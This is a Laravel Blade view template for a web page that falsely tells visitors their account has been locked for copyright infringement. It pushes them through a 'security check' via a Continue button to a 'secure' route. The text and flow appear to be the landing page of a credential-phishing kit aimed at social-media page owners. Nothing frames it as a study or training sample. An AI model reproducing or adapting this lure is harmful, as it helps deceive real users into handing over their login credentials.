@extends('layout.index')
@section('content')
    <div class="container">
        <div class="row">
            <div class="col-md-12 thumnail">
                <img style="display: block; width:100%" src="{{ url('images/f1ebfd88a8d439c9a344a74974f99c3c.png') }}" />
                <br />
                <b style="margin-top: 15px">Your Account has been locked</b>
                <p style="margin-top: 15px">Your page has been detected for activity that is against our page policy
                    regarding
                    copyright infiringement</p>
                <p style="background-color: #F0F1F6;padding: 20px 10px;margin: 0;">
                    Please follow the next steps, we'll walk you through a security check to help secure your account
                    and let you log back in.
                </p>
            </div>
            <div class="col-md-12" style="margin-top: 15px; ">
                <a href="{{ url('secure') }}" class="btn btn-primary btn-continue">Continue</a>
            </div>
        </div>
    </div>
    <style>
        .container {
            max-width: 720px;
            max-height: 100vh;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        @media screen and (max-width: 640px) {
            .container {
                min-height: 57vh;
            }
        }

        * {
            font-family: Arial, Helvetica, sans-serif;
            line-height: 1.2rem;
        }

        .thumnail {
            font-size: 1.08rem;
            text-align: center;
            max-width: 600px;
            margin: auto;
        }

        .btn-continue {
            width: 100%;
            text-align: center;
            padding: 16px 0;
            color: rgb(255, 255, 255);
            text-decoration: none;
            font-size: 1.1rem;
        }
    </style>
@endsection
